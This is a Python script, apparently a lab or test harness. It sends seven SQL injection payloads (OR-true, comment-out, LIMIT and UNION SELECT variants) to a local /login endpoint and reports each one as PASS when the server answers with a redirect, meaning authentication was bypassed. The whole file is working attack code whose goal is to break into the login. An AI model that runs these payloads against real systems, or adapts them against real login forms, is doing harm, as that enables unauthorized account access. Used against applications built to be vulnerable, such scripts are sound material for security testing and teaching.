#!/usr/bin/env python3
"""
SQL Injection Test Script
Tests 7 SQLi payloads against POST /login endpoint
Target: SQLite authentication bypass
"""

import requests
import sys
import time

BASE_URL = "http://localhost:5000"
DELAY = 1.5

PAYLOADS = [
    {
        "id": 1,
        "username": "admin' OR '1'='1'--",
        "password": "anything",
        "description": "OR bypass - classic auth bypass",
        "expected_check": "redirect_302",
    },
    {
        "id": 2,
        "username": "' OR '1'='1'--",
        "password": "anything",
        "description": "Empty username OR bypass",
        "expected_check": "redirect_302",
    },
    {
        "id": 3,
        "username": "admin'--",
        "password": "",
        "description": "Comment out password check",
        "expected_check": "redirect_302",
    },
    {
        "id": 4,
        "username": "admin' AND '1'='1'--",
        "password": "anything",
        "description": "AND true condition",
        "expected_check": "redirect_302",
    },
    {
        "id": 5,
        "username": "' OR 'x'='x'--",
        "password": "anything",
        "description": "String OR bypass with comment",
        "expected_check": "redirect_302",
    },
    {
        "id": 6,
        "username": "1' OR 1=1 LIMIT 1--",
        "password": "anything",
        "description": "LIMIT constraint bypass",
        "expected_check": "redirect_302",
    },
    {
        "id": 7,
        "username": "admin' UNION SELECT 1,'union','pass','union@union.com','2024-01-01'--",
        "password": "anything",
        "description": "UNION SELECT injection (5 columns)",
        "expected_check": "redirect_302",
    },
]

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def test_payload(payload):
    """Test a single SQL injection payload"""
    try:
        data = {
            "username": payload["username"],
            "password": payload["password"],
        }

        response = requests.post(
            f"{BASE_URL}/login",
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False,
            timeout=30,
        )

        passed = False
        result_detail = ""

        if payload["expected_check"] == "redirect_302":
            if response.status_code == 302:
                passed = True
                result_detail = f"HTTP {response.status_code} → {response.headers.get('Location', 'N/A')}"
            else:
                result_detail = f"HTTP {response.status_code}"
        else:
            if response.status_code == 200 and "success" in response.text.lower():
                passed = True
                result_detail = f"HTTP {response.status_code}"
            else:
                result_detail = f"HTTP {response.status_code}"

        return {
            "id": payload["id"],
            "description": payload["description"],
            "username": payload["username"][:50],
            "status_code": response.status_code,
            "passed": passed,
            "detail": result_detail,
        }

    except requests.exceptions.RequestException as e:
        return {
            "id": payload["id"],
            "description": payload["description"],
            "username": payload["username"][:50],
            "status_code": 0,
            "passed": False,
            "detail": str(e),
        }


def print_report(results):
    """Print test results summary"""
    print("\n" + "=" * 70)
    print(f"{BOLD}SQL Injection Test Results - POST /login{RESET}")
    print("=" * 70)

    passed_count = 0

    for r in results:
        status = f"{GREEN}PASS{RESET}" if r["passed"] else f"{RED}FAIL{RESET}"
        if r["passed"]:
            passed_count += 1

        print(f"\n  {BOLD}[{status}]{RESET} Payload #{r['id']}: {r['description']}")
        print(f"    Username: {r['username']}")
        print(f"    Response: HTTP {r['status_code']} - {r['detail']}")

    print("\n" + "-" * 70)
    print(f"{BOLD}Summary: {passed_count}/{len(results)} payloads passed{RESET}")
    if passed_count == len(results):
        print(f"{GREEN}All SQL injection payloads successfully bypassed authentication.{RESET}")
    elif passed_count > 0:
        print(f"{YELLOW}Some payloads worked. Endpoint is vulnerable to SQLi.{RESET}")
    else:
        print(f"{RED}No payloads bypassed authentication.{RESET}")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    print(f"{BOLD}[*] Starting SQL Injection tests against {BASE_URL}/login{RESET}")
    print(f"[*] Testing {len(PAYLOADS)} payloads...\n")

    results = []
    for p in PAYLOADS:
        r = test_payload(p)
        results.append(r)
        time.sleep(DELAY)
    print_report(results)

    sys.exit(0 if any(r["passed"] for r in results) else 1)
